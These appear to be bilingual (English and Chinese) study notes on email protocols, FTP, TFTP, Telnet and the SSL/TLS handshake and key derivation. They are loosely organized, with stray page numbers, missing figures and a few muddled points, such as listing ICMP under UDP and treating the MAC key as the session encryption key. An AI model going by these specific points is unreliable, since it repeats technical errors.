  - requested after protocol initiation, use STLS command,
  - or by POP3S, connects to the server using Transport Layer
Security (TLS) / Secure Sockets Layer (SSL) on 995. an application-layer protocol
POP version 3 (POP3) is common use. used by e-mail clients:
  - to retrieve e-mail from a mail server.
  - supports download and delete operations for messages.
  - POP3 clients connect, retrieve all messages, store them on the
client computer, and finally delete them from the server.
users have only temporary Internet connections, such as dial-up access,
allowing these users to retrieve e-mail when connected, and subsequently to view and manipulate the retrieved messages when offline.
  - POP3 clients have an option to leave mail on the server after download.
  - Internet Message Access Protocol (IMAP) was designed to normally leave all messages on the server to permit management with multiple client applications, and to support both connected (online) and disconnected (offline) modes of
           operation.
Messages available to the client are determined when a POP3 session opens the maildrop, and are identified by message-number local to that session or, optionally, by a unique identifier assigned to the message by the POP server. This unique identifier is permanent and unique to the maildrop and allows a client to access the same message in different POP sessions. Mail is retrieved and marked for deletion by the message- number. When the client exits the session, mail marked for deletion is removed from the maildrop.
IMAP - Internet Message Access Protocol (IMAP) An IMAP server typically listens on 143.
Application Layer Internet protocol
used by email clients:
  - to retrieve email messages from a mail server over a TCP/IP connection.
  - access e-mail on a remote mail server.
IMAP is defined by RFC 3501.
IMAP was designed with the goal of permitting complete management of
an email box by multiple email clients, therefore clients generally
leave messages on the server until the user explicitly deletes them. IMAP over SSL (IMAPS) is assigned the port number 993.
earlier POP3 (Post Office Protocol) are the two most prevalent standard
protocols for email retrieval.
  - Virtually all modern e-mail clients and servers support IMAP,
  - Many webmail service providers: Gmail, Outlook, Yahoo also
provide support for either IMAP or POP3.
Basic Networking Protocols
TCP/IP isn’t a single protocol, but a full suite of protocols.
 TCP - Transmission Control Protocol: three-way handshake, connection- oriented , guaranteed delivery
UDP - User Datagram Protocol (UDP): without three- way handshake, connectionless sessions, best effort to deliver traffic without ensure delivery.
  - ICMP traffic like ping command
  - audio/video streaming use UDP.
  - Many network-based denial- of-service (DoS) attacks use UDP.
TCP/IP traffic: either connection-oriented TCP traffic or connectionless UDP.
IP - The Internet Protocol: identifies hosts in a TCP/IP network, delivers traffic
using IP addresses. IPv4 32-bit, IPv6 128-bit .
ICMP - Internet Control Message Protocol: for testing basic connectivity.
ARP - Address Resolution Protocol: ARP is required once the packet reaches the destination subnet.
resolves IPv4 addresses to media access control (MAC) addresses.
  - TCP/ IP: uses the IP address to get a packet to a destination
network.
  - once it arrives on the destination network, it uses the MAC address to get it to the correct host.
ARP poisoning: use ARP packets to give clients false MAC updates and attackers use it to redirect or interrupt network traffic.
NDP : Neighbor Discovery Protocol: performs several functions on IPv6.
  - Example, it performs functions similar to IPv4’s ARP.
  - performs autoconfiguration of device IPv6 addresses and discovers other IPv6 devices on the network such as the address of the default gateway.
use case: typically describes an organizational goal, administrators enable specific protocols to meet organizational goals. Voice and Video Use Case
UDP:
  - commonly used as the underlying protocol with voice and video streaming.
Real-time Transport Protocol (RTP):
  - delivers audio and video over IP networks.
  - includes Voice over Internet Protocol (VoIP) communications, streaming
media, video teleconferencing applications, and devices using web-based
push-to-talk features.
Secure Real-time Transport Protocol (SRTP):
  - provides encryption, message authentication, and integrity for RTP.
Secure Real-time Transport Protocol (SRTP)
Provide encryption, message authentication, and integrity for streaming media. (Voice over Internet Protocol(VoIP), video teleconferencing)
  - protect the confidentiality of data from these attacks while also ensuring the integrity of the data transmissions.
This provides protection against replay attacks.
SRTP: can be used for both unicast transmissions (like one person calling another) and
multicast transmissions (like one person sends traffic to multiple recipients). SRTP provides encryption, message authentication, and integrity for RTP. File Transfer Use Case
Data-in-transit is any traffic sent over a network. protect the data-in-transit by encrypting it.
can also encrypt data-at-rest (data stored on medium)
basic protocols used to transfer data over a network: FTP - File Transfer Protocol:
  - uploads and downloads large files to and from an FTP server.
  - By default, FTP transmits data in cleartext, easy to capture and read FTP
data with a protocol analyzer.
  - FTP active mode uses TCP port 21 for control signals, TCP port 20 for data.
  - FTP passive mode (PASV) uses TCP port 21 for control signals, but it
uses a random TCP port for data.
  - If FTP traffic is going through a firewall, this random port is often
blocked, so it is best to disable PASV in FTP clients.
TFTP - Trivial File Transfer Protocol UDP port 69
  - used to transfer smaller amounts of data (like communication with
network devices)
  - Many attacks have used TFTP, it is not an essential protocol on most
networks, so commonly disable it.
Several encryption protocols used to encrypt data-in-transit. SSH - Secure Shell: TCP port 22
  - encrypts traffic in transit, encrypt protocols such as FTP.
  - Linux administrators often used Telnet when remotely administering systems, but Telnet sends traffic over the network in cleartext. Instead, administrators commonly use SSH to remotely administer systems.
SCP - Secure Copy:
  - based on SSH.
  - copy encrypted files over a network.
  - SSH can also encrypt TCP Wrappers, a type of access control list used on Linux systems to filter traffic.
SSL - The Secure Sockets Layer protocol:
  - the primary method used to secure HTTP traffic: HTTPS. 2,507

  - can also encrypt other traffic, like SMTP and LDAP.
  - However, it has been compromised, not recommended.
TLS - The Transport Layer Security protocol:
  - replacement for SSL, should be used instead of SSL.
  - create a secure connection between 2 system over the internet.
  - many protocols that support TLS use STARTTLS.
  - a command used to upgrade an unencrypted connection to an encrypted connection on the same port.
IPsec - Internet Protocol security:
  - used to encrypt IP traffic.
  - It is native to IPv6 but also works with IPv4.
  - encapsulates and encrypts IP packet payloads and uses Tunnel mode to
protect virtual private network (VPN) traffic.
  - IPsec includes two main components:
  - Authentication Header (AH): protocol 51
  - Encapsulating Security Payload (ESP): protocol 50.
  - uses the Internet Key Exchange (IKE) over UDP port 500 to
create a security association for the VPN
SFTP - Secure File Transfer Protocol: TCP port 22
  - a secure implementation of FTP.
  - an extension of Secure Shell (SSH): use SSH to transmit the files in an
encrypted format.
FTPS - FileTransferProtocolSecure:
  - an extension of FTP
  - uses TLS to encrypt FTP traffic.
  - Some implementations of FTPS use TCP ports 989 and 990.
  - However, TLS can also encrypt the traffic over the ports used by FTP
(20 and 21).
       散列函数Hash 常⻅: MD5、SHA1、SHA256，特点是函数单向不可逆、对输 入非常敏感、输出⻓度固定，针对数据的任何修改都会改变散列函 数的结果，用于防止信息篡改并验证数据的完整性;
在信息传输过程中，散列函数不能单独实现信息防篡改，因为 明文传输，中间人可以修改信息之后重新计算信息摘要，因此需要 对传输的信息以及信息摘要进行加密;
对称加密
常⻅: AES-CBC、DES、3DES、AES-GCM等，相同的密钥可 以用于信息的加密和解密，掌握密钥才能获取信息，能够防止信息 窃听，通信方式是1对1;
对称加密的优势是信息传输1对1，共享相同的密码，密码的安 全是保证信息安全的基础，服务器和 N 个客户端通信，需要维持 N 个密码记录，且缺少修改密码的机制;
非对称加密
即常⻅的 RSA 算法, ECC、DH 等算法，算法特点是密钥成对 出现，一般称为公钥(公开)和私钥(保密)，公钥加密的信息只能私 钥解开，私钥加密的信息只能公钥解开。因此掌握公钥的不同客户 端之间不能互相解密信息，只能和掌握私钥的服务器进行加密通 信，服务器可以实现1对多的通信，客户端也可以用来验证掌握私 钥的服务器身份。
非对称加密的特点是信息传输1对多，服务器只需要维持一个私 钥就能够和多个客户端进行加密通信，但服务器发出的信息能够被 所有的客户端解密，该算法的计算复杂，加密速度慢。 结合三类算法的特点，TLS的基本工作方式是，客户端使用非对 称加密与服务器进行通信，实现身份验证并协商对称加密使用的密 钥，然后对称加密算法采用协商密钥对信息以及信息摘要进行加密 通信，不同的节点之间采用的对称密钥不同，从而可以保证信息只 能通信双方获取。
 SSL Secure Socket Layer:安全套接字层。为Netscape所研发， 当前版本为3.0。
SSL协议位于TCP/IP协议与各种应用层协议之间，为Internet上数
据传输，数据通讯提供安全支持。利用数据加密(Encryption) 技术，确保数据在网络上之传输过程中不会被截取。广泛用于 Web浏览器与服务器之间的身份认证和加密数据传输。
SSL协议可分为两层:
  - SSL握手协议(SSL Handshake Protocol):在SSL记 录协议之上，协商密钥。用于在数据传输开始前，通讯
双方进行身份认证、协商加密算法、交换加密密钥等。
   - SSL记录协议(SSL Record Protocol):定义传输的格 式。它建立在可靠的传输协议(如TCP)之上，为高层 协议提供数据封装、压缩、加密等基本功能的支持。
⁃
For fragmentation, compression, intergetity, confidentiality, framing.
 TLS:(Transport Layer Security，传输层安全协议)，用于两个应
用程序之间提供保密性和数据完整性。  TLS 1.0是IETF(Internet Engineering Task Force，Internet工程
任务组)制定的一种新的协议，它建立在SSL 3.0协议规范之 上，是SSL 3.0的后续版本，可以理解为SSL 3.1，它是写入
了 RFC 的。 该协议由两层组成:
   - TLS 握手协议(TLS Handshake)
   - TLS 记录协议(TLS Record)
 SSL/TLS协议提供的服务主要有:
1. 认证用户和服务器，确保数据发送到正确的客户机和服务器;
 2. 加密数据以防止数据中途被窃取;
 3. 维护数据的完整性，确保数据在传输过程中不被改变。
 由于非对称加密的速度比较慢，所以它一般用于密钥交换，双方通 过公钥算法协商出一份密钥，然后通过对称加密来通信，当然，为 了保证数据的完整性，在加密前要先经过HMAC的处理。
SSL缺省只进行server端的认证，客户端的认证是可选的。
   1.2 TLS
SSL的差异
与
   SSL has been compromised, not used.
SSL vulnerability: POODLE attack. Padding Oracle on  Downgraded Legacy Encryption.
US government prohibit the use of SSL.
1. 版本号:TLS记录格式与SSL记录格式相同，但版本号的值不 同，TLS的版本1.0使用的版本号为SSLv3.1。
2. 报文鉴别码:SSLv3.0和TLS的MAC算法及MAC计算的范围 不同。TLS使用了RFC-2104定义的HMAC算法。SSLv3.0使 用了相似的算法，两者差别在于SSLv3.0中，填充字节与密钥 之间采用的是连接运算，而HMAC算法采用的是异或运算。但 是两者的安全程度是相同的。
3. 伪随机函数:TLS使用了PRF的伪随机函数来将密钥扩展成数 据块，更安全。
4. 报警代码:TLS支持几乎所有的SSLv3.0报警代码，而且TLS 还补充定义了很多报警代码，如解密失败 (decryption_failed)、记录溢出(record_overflow)、未知 CA(unknown_ca)、拒绝访问(access_denied)等。
5. 密文族和客户证书:SSLv3.0和TLS存在少量差别，即TLS不 支持Fortezza密钥交换、加密算法和客户证书。
6. certificate_verify和finished消息:SSLv3.0和TLS在用 certificate_verify和finished消息计算MD5和SHA-1散列码时，   计算的输入有少许差别，但安全性相当。
7. 加密计算:TLS与SSLv3.0在计算主密值(master secret)时
采用的方式不同。
8. 填充:用户数据加密之前需要增加的填充字节。在SSL中，填
充后的数据⻓度要达到密文块⻓度的最小整数倍。而在TLS 中，填充后的数据⻓度可以是密文块⻓度的任意整数倍(但填 充的最大⻓度为255字节)，这种方式可以防止基于对报文⻓ 度进行分析的攻击。
TLS的主要增强内容 TLS的主要目标是使SSL更安全，并使协议的规范更精确和完善。
TLS 在SSL v3.0 的基础上，提供了以下增强内容:
1. 更安全的MAC算法
2. 更严密的警报
3. “灰色区域”规范的更明确的定义
TLS对于安全性的改进
1. 对于消息认证使用密钥散列法:TLS 使用“消息认证代码的密
钥散列法”(HMAC)，当记录在开放的网络(如因特网)上 2,515

传送时，该代码确保记录不会被变更。SSLv3.0还提供键控消 息认证，但HMAC比SSLv3.0使用的(消息认证代码)MAC 功能更安全。
2. 增强的伪随机功能(PRF):PRF生成密钥数据。在TLS中， HMAC定义PRF。PRF使用两种散列算法保证其安全性。如果 任一算法暴露了，只要第二种算法未暴露，则数据仍然是安全 的。
3. 改进的已完成消息验证:TLS和SSLv3.0都对两个端点提供已 完成的消息，该消息认证交换的消息没有被变更。然而，TLS 将此已完成消息基于PRF和HMAC值之上，这也比SSLv3.0更 安全。
4. 一致证书处理:与SSLv3.0不同，TLS试图指定必须在TLS之 间实现交换的证书类型。
5. 特定警报消息:TLS提供更多的特定和附加警报，以指示任一 会话端点检测到的问题。TLS还对何时应该发送某些警报进行 记录。 ▪


##  TLS与SSH的差异
     SSL是一种保护通过网络传输的数据的通用方法
SSH是一种用于登录和共享数据的网络程序 SSL证书主要是部署在网站服务器中，通过SSL协议实现浏览器客
户端与网站服务器通信链路上的数据加密，并认证网站服务器身
份，防止钓⻥网站。保障浏览器和网站服务器之间安全通信，免受 网络“中间人”窃取信息。
传统的HTTP协议采用明文传输数据，用户数据存在被窃取和 篡改的⻛险。
 部署了SSL证书的网站，可以采用安全的HTTPS协议进行访 问。
  - 当浏览器访问以“https://”开头的URL时，浏览器通过SSL 连接使用HTTP。
  - SSL协议会在数据传输之前对数据进行加密再进行网络 传输，保证了用户数据在传输链路上的安全。
SSH相当于一个隧道，数据通过的时候保护它不被泄露和篡改，为 shell提供安全的传输和运用环境。 SSH只是一种协议，它有很多实现方法。在Linux中SSH几乎是标 配，其中用的最多的实现是OpenSSH。在Windows系统中使用 SSH，会用到另一种软件PuTTY。
   差异
SSH 代表了“Secure Shell”。使联网的计算机1能够访问联网计算 机2上的shell，以计算机1的身份登录主机，并对他进行操作。 SSL 代表“安全套接字层”。使浏览器能够以一种安全的加密方式在 web服务器之间传输数据，从而使监视所有internet流量的第三方间 谍难以生存。SSL和主机用户名登录没有任何关系，本身并不实现 主机登录的功能，它只是一个单纯的加密功能。 Handshake Protocol
4 SSL protocols:  基本的运行过程
SSL/TLS协议的基本思路是采用公钥加密法，cliemt先向服务器端索要公 钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。
(1)如何保证公钥不被篡改? 解决方法:将公钥放在数字证书中。只要证书是可信的，公钥就是可信 的。
(2)公钥加密计算量太大，如何减少耗用的时间? 解决方法:每一次对话(session)，客户端和服务器端都生成一个"对话 密钥"(session key)，用来加密信息。由于"对话密钥"是对称加密，所以 运算速度非常快，而服务器公钥只用于加密"对话密钥"本身，这样就减少 了加密运算的消耗时间。
握手之后的对话使用"对话密钥"加密(对称加密)，服务器的公钥和私钥 只用于加密和解密"对话密钥"(非对称加密)，无其他作用。 因此，SSL/TLS协议的基本过程是这样的:
(1) 客户端向服务器端索要并验证公钥。
(2) 双方协商生成"对话密钥"。
(3) 双方采用"对话密钥"进行加密通信。 上面过程的前两步，又称为"握手阶段"(handshake)。
     1. Handshake Protocol:
SSL缺省只进行server端的认证，客户端的认证是可选的。
  Phase I of Handshake Protocol:
 1. ClientHello 客户端发出请求
  - 传输过程中必须使用同一套加解密算法才能保证数据能够正常的
加解密。
  - 客户端需要将本地支持的加密套件(Cipher Suite)的列表传送给服
务端。
  TSL version 支持的最高version
  - 从低到高依次: SSLv2 < SSLv3 < TLSv1 < TLSv1.1
< TLSv1.2
  - 当前基本不再使用低于 TLSv1 的版本;
Client random number 随机数 random_C，用于后续的密
钥的生成
⁃
⁃
⁃
⁃
  Session ID
 客户端支持的加密套件 列表
  - 每个加密套件对应前面 TLS 原理中的四个功能的组
cipher suites 合:
  - 认证算法 Au (身份验证)、
  - 密钥交换算法 KeyExchange(密钥协商)、
  - 对称加密算法 Enc (信息加密)
  - 和信息摘要 Mac(完整性校验);
  - compression methods 支持的压缩算法 列表，用于后续的 信息压缩传输;
  - 扩展字段 extensions，支持协议与算法的相关参数以及其 它辅助信息等，常⻅的 SNI 就属于扩展字段，后续单独讨 论该字段作用。
2. SeverHello 服务器回应
  - 服务端返回协商的信息结果，包括
  - 选择使用的协议版本 version，
  - 随机数 random_S
  - Session ID
  - 选择的加密套件 cipher suite，
  - 选择的压缩算法 compression method ⁃...
3. 客户端和服务端都需要使用这两个随机数来产生Master Secret。
After Phase I, the client and server know the following:
❏ Version of SSL
❏ The two random numbers for key generation, 稍后用于生成”对话密钥”
❏ Session ID
❏ Cipher set: The algorithms for key exchange, message authentication, and encryption
❏ The compression method
Phase II of Handshake Protocol:
    客户端回应:
1. ServerCertificate 服务器端配置对应的证书链，用于身份验证与密钥交
换;
  - 在接收到Client Hello之后，服务端将自己的证书发送给客户端。
  - 证书是对于服务端的一种认证。
  - 需要申请，由专⻔的数字证书认证机构(CA)严格审核后颁
发的电子证书。
  - 颁发证书的同时会产生一个私钥和公钥。
  - 私钥由服务端自己保存，不可泄漏。
  - 公钥则是附带在证书的信息中，可以公开的。
  - 证书本身也附带一个证书电子签名
  - 这个签名用来验证证书的完整性和真实性，
  - 可以防止证书被串改。
  - 证书有有效期。
2. ServerKeyExchange
  - 在服务端向客户端发送的证书中没有提供足够的信息(证书公
钥)的时候，还可以向客户端发送一个 ServerKeyExchange. 2,528

  - servercertificate 没有携带足够的信息时，发送给客户端以计算 pre-master，如基于 DH 的证书，公钥不被证书中包含，需要单 独发送;
3. ClientCertificateRequest
  - 此外，对于非常重要的保密数据，服务端还需要对客户端进行验
     证，以保证数据传送给了安全的合法的客户端。
  - client收到后，首先需要向服务端发送client的证书，验证client的
合法性。
  - 向client发出 CerficateRequest 消息，要求client发送证书对客户
端的合法性进行验证。
  - 比如，金融机构往往只允许认证客户连入自己的网络，就会向正
式客户提供USB密钥，里面就包含了一张客户端证书。
4. ServerHelloDone 通知客户端 server_hello 信息发送结束;
  - 最后server会发送一个ServerHelloDone消息给client，表示 ServerHello消息结束了。
After Phase II,
❏ The server is authenticated to the client.
❏ The client knows the public key of the server if required.
4 cases in Phase II
   Phase III of Handshake Protocol
  1. Certificate client对server的证书进行检查:
  - 证书链的可信性 trusted certificate path，方法如前文所述;
   - 证书是否吊销 revocation，有两类方式:
  - 离线 CRL 与在线 OCSP，
  - 不同的客户端行为会不同;
  - 有效期 ，证书是否在有效时间范围;
  - 域名     ，核查证书域名是否与当前的访问域名匹配，
匹配规则后续分析;
  - 如果证书不是可信机构颁布、或者证书中的域名与实际域名不一
致、或者证书已经过期，就会向访问者显示一个警告，由其选择
是否还要继续通信。
  - 如果证书没有问题，client从服务器证书中取出服务器的公钥。
  - client_certificate与certificate_verify_message
  - If 服务器要求验证客户端，采用client的私钥加密的一段基于已经
     协商的通信信息得到数据，服务器可以采用对应的公钥解密并验
证;
2. ClientKeyExchange
  - 合法性验证通过之后，客户端使用加密算法(如RSA, Diffie- Hellman)产生一个48个字节的Key, PreMaster Secret/Key，用证 书公钥加密，发送给服务器;
  - 该随机数用服务器公钥加密，防止被窃听
  - 此时客户端已经获取全部的计算协商密钥需要的信息:两个明文
随机数 random_C 和 random_S 与自己计算产生的 Pre-
master，计算得到协商密钥session secret ;
  - enc_key=Fuc(random_C, random_S, Pre-Master)
3. CertificateVerify
  - 编码改变通知，表示随后的信息都将用双方商定的加密方法和密
钥发送
  - client握手结束通知，表示client的握手阶段已经结束。这一项同
时也是前面发送的所有内容的hash值，用来供服务器校验
After Phase III,
❏ The client is authenticated for the server.
❏ Both the client and the server know the pre-master secret.
4 cases in Phase III
 expirydate
domain
     Phase IV of Handshake Protocol
 Client:
1. ChangeCipherSpec
  - ChangeCipherSpec是一个独立的协议，体现在数据包中就是一 个字节的数据，用于告知服务端，客户端已经切换到之前协商好 的加密套件(Cipher Suite)的状态，准备使用之前协商好的加 密套件加密数据并传输了。
  - 在ChangecipherSpec传输完毕之后，客户端会使用之前协商好 的加密套件和SessionSecret加密一段 Finish 的数据传送给服务 端，此数据是为了在正式传输应用数据之前对刚刚握手建立起来 的加解密通道进行验证。
2. Finished encrypted_handshake_message，
  - client结合之前所有通信参数的hash值与其它相关信息生成一段
数据，采用协商密钥 session secret 与算法进行加密，然后发送 给服务器用于数据与握手验证;
Server:
1. 服务器
  - 用私钥解密加密的 Pre-master 数据，基于之前交换的两个明文
随机数 random_C 和 random_S，计算得到协商密钥session secret :
  - enc_key=Fuc(random_C, random_S, Pre-Master);
  - 计算之前所有接收信息的hash值,然后解密客户端发送的
encrypted_handshake_message,验证数据和密钥正确性;
2. ChangeCipherSpec
  - change_cipher_spec, 验证通过之后，服务器同样发送 ChangeCipherSpec 以告知客户端后续的通信都采用协商的密钥 与算法进行加密通信;
3. Finished encrypted_handshake_message
  - 服务器也结合所有当前的通信参数信息生成一段数据并采用协商
密钥 SessionSecret 与算法加密一段 Finish 消息发送给客户端，
以验证之前通过握手建立起来的加解密通道是否成功。
4. 如果客户端和服务端都能对Finish信息进行正常加解密且消息正确的被 验证，则说明握手通道已经建立成功，接下来，双方可以使用上面产
生的Session Secret对数据进行加密传输了。 2,533

5. 客户端计算所有接收信息的 hash 值，并采用协商密钥解密 encrypted_handshake_message，验证服务器发送的数据和密钥，验 证通过则握手完成;
6. 握手结束
7. 加密通信, 开始使用协商密钥与算法进行加密通信。
After Phase IV, the client and server are ready to exchange data.
注意:
alter message 用于指明在握手或通信过程中的状态改变或错误信息，一般 告警信息触发条件是连接关闭，收到不合法的信息，信息解密失败，用户取 消操作等，收到告警信息之后，通信会被断开或者由接收方决定是否断开连 接。
DH算法的握手阶段
· 整个握手阶段都不加密(也没法加密)，都是明文。因此，如果有人
窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两 个。整个通话的安全，只取决于第三个随机数(Premaster secret)能 不能被破解。
- 虽然理论上，只要服务器的公钥足够⻓(比如2048位)，那么 Premaster secret可以保证不被破解。但是为了足够安全，我们可以考 虑把握手阶段的算法从默认的RSA算法，改为 Diffie-Hellman算法(简 称DH算法)。
- 采用DH算法后，Premaster secret不需要传递，双方只要交换各自的 参数，就可以算出这个随机数。
    上图中，第三步和第四步由传递Premaster secret变成了传递DH算法所需的 参数，然后双方各自算出Premaster secret。这样就提高了安全性。
17.2.2 ChangeCipher Spec Protocol
Movement of parameters from pending state to active state  17.2.3 Alert Protocol Alerts defined for SSL  17.2.4 Record Protocol
Processing done by the Record Protocol  Calculation of MAC  17-3 SSL MESSAGE FORMATS
17.3.1 ChangeCipherSpec Protocol Record Protocol general header
ChangeCipherSpec message
17.3.2 Alert Protocol Alert message
    17.3.3 Handshake Protocol
Generic header for Handshake Protocol
Types of Handshake messages
  Virtual tributary types
ClientHello message
  ServerHello message
 Certificate message  ServerKeyExchange message
 CertificateRequest message  ServerHelloDone message
CertificateVerify message
  Hash calculation for CertificateVerify message  ClientKeyExchange message
 Finished message  Hash calculation for Finished message
 17.3.4 Application Data
Record Protocol message for application data  17-4 Transport Layer Security (TLS)
17.4.1 Version
The first difference is the version number (major and minor). The current version of SSL is 3.0; the current version of TLS is 1.0. In other words, SSLv3.0 is compatible with TLSv1.0.
17.4.2 Cipher Suite
Another minor difference between SSL and TLS is the lack of support for the Fortezza method. TLS does not support Fortezza for key exchange or for encryption/decryption. Table 17.6 shows the cipher suite list for TLS (without export entries).
Cipher Suite for TLS
          17.4.3 Generation of Cryptographic Secrets Data-expansion function  PRF
 Master secret generation  Key material generation
17.4.4 Alert Protocol
TLS supports all of the alerts defined in SSL except for NoCertificate. TLS also adds some new ones to the list. Table 17.7 shows the full list of alerts supported by TLS.
   Alerts defined for TLS
 17.4.5 Handshake Protocol
Hash for CertificateVerify message in TLS
 Hash for Finished message in TLS
 17.4.6 Record Protocol HMAC for TLS   几个secret Keys   PreMaster secret
client 使用RSA或者Diffie-Hellman等加密算法生成PreMaster Secret
 Pre-master 结合 random client 和 random server 两个随机数通过 PseudoRandomFunction(PRF)计算得到
 Master Secret。
由于在Say Hello阶段，随机数都是明文传送的，如果PreMaster Secret泄 漏的话，会导致整个SSL/TLS失效。
client使用server的公钥对PreMaster Secret进行加密, 传送给server， server使用私钥进行解密得到PreMaster secret。
server和client都有一份相同的PreMaster secret和随机数。  PreMaster secret前两个字节是TLS的版本号，用来核对握手数据的版本号.
因为在Client Hello阶段，客户端会发送一份加密套件列表和当前支持的 SSL/TLS的版本号给服务端，而且是使用明文传送的，如果握手的数
据包被破解之后，攻击者很有可能串改数据包，选择一个安全性较低 的加密套件和版本给服务端，从而对数据进行破解。
所以，server需要对密文中解密出来对的PreMaster版本号跟之前Client Hello阶段的版本号进行对比，如果版本号变低，则说明被串改，则立 即停止发送任何消息。
Master secret
 由于server和client都有一份相同的PreMaster secret和随机数，server和 client将计算出同样的Master secret。
Master secret 结合 random client 和 random server 两个随机数通过迭代 计算得到 Key material;
 Master secret是系列的hash值组成的，它将作为数据加解密相关的secret 的 Key Material 的一部分。
Key Material最终解析出来的数据如下:   write MAC key，就是session secret/key。
Client write MAC key是客户端发数据的session secret，
Server write MAC secret是服务端发送数据的session key。 MAC(Message Authentication Code)，是一个数字签名，用来验证数据的
  完整性，可以检测到数据是否被串改。
  以下为一些重要的记录，可以解决部分爱深入研究朋友的疑惑，copy的材 料，分享给大家:
(a) PreMaster secret 前两个字节是 TLS 的版本号，这是一个比较重要的 用来核对握手数据的版本号，因为在 Client Hello 阶段，客户端会发送一份 加密套件列表和当前支持的 SSL/TLS 的版本号给服务端，而且是使用明文 传送的，如果握手的数据包被破解之后，攻击者很有可能串改数据包，选择 一个安全性较低的加密套件和版本给服务端，从而对数据进行破解。所以， 服务端需要对密文中解密出来对的 PreMaster 版本号跟之前 Client Hello 阶 段的版本号进行对比，如果版本号变低，则说明被串改，则立即停止发送任 何消息。(copy)
(b) 不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每 次都一样。由于 SSL 协议中证书是静态的，因此十分有必要引入一种随机 因素来保证协商出来的密钥的随机性。
对于 RSA 密钥交换算法来说，pre-master-key 本身就是一个随机数，再 加上 hello 消息中的随机，三个随机数通过一个密钥导出器最终导出一个对 称密钥。
pre master 的存在, 在于 SSL 协议不信任每个主机都能产生完全随机的 随机数，如果随机数不随机，那么 pre master secret 就有可能被猜出来，那 么仅适用 pre master secret 作为密钥就不合适了，因此必须引入新的随机因 素，那么客户端和服务器加上 pre master secret 三个随机数一同生成的密钥 就不容易被猜出了，一个伪随机可能完全不随机，可是三个伪随机就十分接 近随机了，每增加一个自由度，随机性增加的可不是一。
 17.1.1 Services
For fragmentation, compression, intergetity, confidentiality, framing.
17.1.2 Key Exchange Algorithms  Null: no key exchange in this method. No pre-master secret is established between the client and the server.
RSA: RSA key exchange; server public key
Anonymous Diffie-Hellman: Anonymous Diffie-Hellman key exchange.
    Ephemeral Diffie-Hellman key exchange: Ephemeral Diffie-Hellman key exchange
 Fixed Diffie-Hellman: Another solution is the fixed Diffie-Hellman method. All entities in a group can prepare fixed Diffie-Hellman parameters (g and p). Fortezza: Fortezza is a registered trademark of the U.S. National Security Agency
   (NSA). It is a family of security protocols developed for the Defense Department.
17.1.3 Encryption/Decryption Alogrithms
NULL: The NULL category simply defines the lack of an encryption/decryption algorithm.
Stream RC: Two RC algorithms are defined in stream mode.
Block RC: One RC algorithm is defined in block mode.
DES: All DES algorithms are defined in block mode.
IDEA: The IDEA algorithm defined in block mode is IDEA_CBC, with a 128-bit key.
Fortezza: The one Fortezza algorithm defined in block mode is FORTEZZA_CBC.
17.1.4 Hash Algorithms
NULL: The two parties may decline to use an algorithm. In this case, there is no hash function and the message is not authenticated.
MD5: hash algorithm. a 128-key MD5 hash algorithm.
SHA-1: hash algorithm. a 160-bit SHA-1 hash algorithm.
17.1.5 Cipher Suite
The combination of key exchange, hash, and encryption algorithms defines a cipher suite for each SSL session.
                 SSL cipher suite list: SSL_key exchange with_encrpytion_hash.
 17.1.6 Compression Algorithms
Compression is optional in SSLv3.
No specific compression algorithm is defined for SSLv3. Therefore, the default compression method is NULL.
17.1.7 Crypography Parameter Generation Calculation of master secret from pre-master secret
    Calculation of key material from master secret:
 Extractions of cryptographic secrets from key material:  17.1.8 Session and Connections A session and connections:
 Session state parameters: ▪


##  Connection state parameters:
 File Transfer Protocol (FTP)
move files from one computer to another.
相比HTTP，FTP要复杂得多。 2,565

▪
  - 因为FTP协议要用到两个TCP连接: TCP service.
  - operate on TCP 20 and 21.
20: data stream, 数据链路
  - transfers the data between the client and the server.   - 用来上传或下载数据。
21: control stream, 命令链路
  - to pass commands between the FTP client and the FTP
server.
The best choice to send large files if they don’t contain sensitive data.
FTP service, user able to connect to the FTP service, download their personal files, but cannot transfer new files to the server.
In the case of creating a Web site, you create the pages for your site on your computer, then you will need to move it to the server where your site will be hosted. FTP is the main way to do this.
Once you get into the server, you're going to see a series of reply codes, tell the state of the data transfer.
         - Create an ACL to allow the FTP service write access to user directories. ▪


##  PORT & PASV
FTP 两种工作方式:PORT主动式和PASV被动式。 两种方式的命令链路连接方法一样，数据链路建立方法
不同。 而FTP的复杂性就在于此。选择用PASV方式还是PORT
方式登录FTP服务器，选择权在FTP客户端。
   ▪


## PORT(主动)方式:
Classic FTP uses what's called an active request,
- the client initiates that data transfer, 客户端向服务器的FTP端 口(默认是21)发送连接请求，
- the FTP server maintains state information, 服务器接受连接， 建立一条命令链路。
  - such as current directory and any user authentication. 当需要传送数据时
  - 客户端在命令链路上用PORT命令告诉服务器:“我 打开了XXXX端口，你过来连接我”。
  - 服务器从20端口向客户端的XXXX端口发送连接请 求，建立一条数据链路来传送数据。
PASV(被动)方式:
most command, PASV request,
- preferred for clients that are behind a firewall, as it's more secure
  - because the client, not the server, initiates the transfer.
- clients asks the server to accept a data connection over a new TCP
port,
- the server normally accepts with the code 227.
- And then the server will provide a port in which to make the connection.
 ▪


## 客户端向服务器的FTP端口(默认是21)发送连接请求， 服务器接受连接，建立一条命令链路。
当需要传送数据时
  - 服务器在命令链路上用PASV命令告诉客户端:
“我打开了XXXX端口，你过来连接我”。
  - 客户端向服务器的XXXX端口发送连接请求，建立
  一条数据链路来传送数据。
  Secure File-Transfer Protocol (SFTP).
Encrypted the files using secure shell (SSH)
TFTP - Trivial File Transfer Protocol UDP port 69
- to transfer smaller amounts of data (like communication
with network devices)
- to transfer router configuration files and by cable
companies to configure cable modems.
- requires no authentication (big security risk) ▪


##   - Many attacks have used TFTP
  - not an essential protocol on most networks, commonly
disable it.
Telnet Protocol (RFC 854)
provides a general, bidirectional, not encrypted communication. TCP service
on port 23.
Allows a computer to connect to another one
  - enables a client at one site to establish a session with a host at another site.
  - the program passes the info typed at the clients keyboard to the host computer system.
Provides remote login capabilities to computers on the Internet Sends whatever you type
Prints whatever comes back
Useful for testing TCP servers (ASCII based protocols)
sends data in clear.
  - easy to sniffer, include password. Configuration using Telnet:
One client, one server. The server needs to listening at server first.
         Email and Web Use Cases
Email: send, receive email/secure email, manage email folders. Web: provide secure access to the Internet.
web servers: provide access to web servers by external clients.
Many of these protocols support the use of STARTTLS
Instead of using one port to transmit data in cleartext, a second port to transmit
data in ciphertext
